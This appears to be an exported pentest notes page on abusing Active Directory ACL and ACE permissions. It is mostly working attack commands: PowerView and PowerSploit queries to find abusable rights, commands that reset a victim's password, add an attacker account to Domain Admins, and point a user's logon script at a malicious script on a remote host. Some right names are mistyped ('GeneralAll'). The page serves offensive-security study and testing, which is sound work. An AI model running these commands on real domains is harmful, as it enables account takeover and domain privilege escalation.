<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abuse Vulnerable ACLs & ACEs</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Abuse Vulnerable ACLs &amp; ACEs</h1></strong><br />A DACL is a Discretionary Access Control List.<br />Active Directory objects - users, groups, etc. - are securable objects.<br />DACLs define who has permissions on these objects (change account name, reset password, etc.)<br /><br />DACLs compirse of:<br />• Access Control Lists - <code>ACLs</code><br />• Acccess Control Entries - <code>ACEs</code><br /><br /><strong><h2>## Interesting Object Permissions</h2></strong><br />Some of the Active Directory object permissions and types that attackers are interested in include:<br />• <code>GenericAll</code> - full rights to the object (add users to a group or reset user&#39;s password)<br />• <code>GenericWrite</code> - update object&#39;s attributes (i.e logon script)<br />• <code>WriteOwner</code> - change object owner to attacker controlled user take over the object<br />• <code>WriteDACL</code> - modify object&#39;s ACEs and give attacker full control right over the object<br />• <code>AllExtendedRights</code> - ability to add user to a group or reset password<br />• <code>ForceChangePassword</code> - ability to change user&#39;s password<br />• <code>Self (Self-Membership)</code><strong> </strong>- ability to add yourself to a group<br /><br /><strong><h3>### GeneralAll on User</h3></strong><br />Wtih <code>GeneralAll</code> you can reset a user&#39;s password.<br /><br /><strong>#### PowerView</strong><br /><div class="codebox"><div class="codebox">#&nbsp;Find&nbsp;all&nbsp;users&nbsp;that&nbsp;have&nbsp;GenericAll&nbsp;rights&nbsp;for&nbsp;a&nbsp;specific&nbsp;user&nbsp;-&nbsp;jimmy<br />Get-ObjectAcl&nbsp;-SamAccountName&nbsp;jimmy&nbsp;-ResolveGUIDs&nbsp;|&nbsp;?&nbsp;{$_.ActiveDirectoryRights&nbsp;-eq&nbsp;&quot;GenericAll&quot;}&nbsp;|&nbsp;select&nbsp;IdentityReference,&nbsp;ActiveDirectoryRights,&nbsp;ObjectDN<br /><br />#&nbsp;Find&nbsp;all&nbsp;users&nbsp;that&nbsp;have&nbsp;GenericAll&nbsp;rights&nbsp;against&nbsp;every&nbsp;user<br />Get-ObjectAcl&nbsp;-SamAccountName&nbsp;*&nbsp;-ResolveGUIDs&nbsp;|&nbsp;?&nbsp;{$_.ActiveDirectoryRights&nbsp;-eq&nbsp;&quot;GenericAll&quot;}&nbsp;|&nbsp;select&nbsp;IdentityReference,&nbsp;ActiveDirectoryRights,&nbsp;ObjectDN<br /><br />#&nbsp;Check&nbsp;what&nbsp;rights&nbsp;your&nbsp;current&nbsp;user&nbsp;-&nbsp;marcusj&nbsp;-&nbsp;has&nbsp;over&nbsp;another&nbsp;specific&nbsp;user&nbsp;-&nbsp;spencero<br />Get-ObjectAcl&nbsp;-SamAccountName&nbsp;spencero&nbsp;-ResolveGUIDs&nbsp;|&nbsp;?&nbsp;{$_.IdentityReference&nbsp;-eq&nbsp;&quot;TOKYO\marcusj&quot;}&nbsp;|&nbsp;select&nbsp;IdentityReference,&nbsp;ActiveDirectoryRights,&nbsp;ObjectDN<br /><br />#&nbsp;Check&nbsp;what&nbsp;rights&nbsp;your&nbsp;current&nbsp;user&nbsp;-&nbsp;marcusj&nbsp;-&nbsp;has&nbsp;over&nbsp;every&nbsp;other&nbsp;user<br />Get-ObjectAcl&nbsp;-SamAccountName&nbsp;*&nbsp;-ResolveGUIDs&nbsp;|&nbsp;?&nbsp;{$_.IdentityReference&nbsp;-eq&nbsp;&quot;TOKYO\marcusj&quot;}&nbsp;|&nbsp;select&nbsp;IdentityReference,&nbsp;ActiveDirectoryRights,&nbsp;ObjectDN</div></div><br /><br />Find <code>samaccountname</code> from DistinguishedName<br /><code>Get-NetUser -ADSpath &quot;LDAP://CN=Oswell Spencer,CN=Users,DC=tokyo,DC=umbrella,DC=local&quot;</code><br /><br />Reset jimmy&#39;s password without knowing their current password<br /><code>net user jimmy test123 /domain</code><br /><br /><strong><h3>### GenericAll on Group</h3></strong><br />You can add yourself to the group with <code>GeneralAll</code> permissions on a group.<br /><br /><strong>#### PowerView</strong><br />Grab group - e.g. Domain Admins - <code>distinguishedName</code><br /><code>Get-NetGroup &quot;domain admins&quot; -FullData</code><br /><br />Check if your current user has GenericAll rights for the <code>Domain Admins</code> group<br /><code> Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq &quot;CN=Domain Admins,CN=Users,DC=offense,DC=local&quot;}</code><br /> <br />Add your current user - <code>attacker1</code> - to the Domain Admin group<br /><code>net group &quot;domain admins&quot; attacker1 /add /domain</code><br />    # with active directory module<br />    <code>Add-ADGroupMember -Identity &quot;domain admins&quot; -Members attacker1</code><br />    # with Powersploit<br />    <code>Add-NetGroupUser -UserName attacker1 -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;</code><br /><br /><strong><h3>### GenericAll / GenericWrite / Write on Computer</h3></strong><br />Can do <a href="http:///offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">Kerberos Resource-based Constrained Delegation: Computer Object Take Over</a> <br /><br /><strong><h3>### WriteProperty on Group</h3></strong><br />If a group has the <code>WriteProperty</code> permission, you can write yourself into that group.<br /><br /><code>Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;</code><br /><br /><strong><h3>### Self (Self-Membership) on Group</h3></strong><br />Can write yourself into that group.<br /><code>Object type: Self-Membership</code><br /><br /><code>Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;</code><br /><br /><strong><h3>### WriteProperty (Self-Membership)</h3></strong><br />Can write yourself into that group<br /><code>Object type: Self-Membership</code><br /><br /><code>net group &quot;domain admins&quot; spotless /add /domain</code><br /><code>Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;</code><br /><br /><strong><h3>### ExtendedRight on User-Force-Change-Password</h3></strong><br />Can reset the user&#39;s password<br /><br /><strong>#### PowerView</strong><br />Check if your current user has ExtendedRight on User-Force-Change-Password oject.<br /><code>Get-ObjectAcl -SamAccountName jimmy -ResolveGUIDs | ? {$_.IdentityReference -eq &quot;OFFENSE\attacker1&quot;}</code><br /><br />PowerView interactive - change password:<br /><code>Set-DomainUserPassword -Identity jimmy -Verbose</code><br /><br />PowerView interactive v2 - change password:<br /><code>$c = Get-Credential<br />Set-DomainUserPassword -Identity jimmy -AccountPassword $c.Password -Verbose</code><br /><br />PowerView non-interactive - change password:<br /><code>Set-DomainUserPassword -Identity jimmy -AccountPassword (ConvertTo-SecureString &#39;123456&#39; -AsPlainText -Force) -Verbose</code><br /><br /><strong><h3>### WriteProperty on User Script-Path</h3></strong><br />Can overwrite the logon script for specific user.<br />When the user logs in, our maliciuos script will run.<br /><br /><code>Set-ADObject -SamAccountName jimmy -PropertyName scriptpath -PropertyValue &quot;\\10.0.0.5\totallyLegitScript.ps1&quot;</code><br /><br /></div>
</body>
</html>
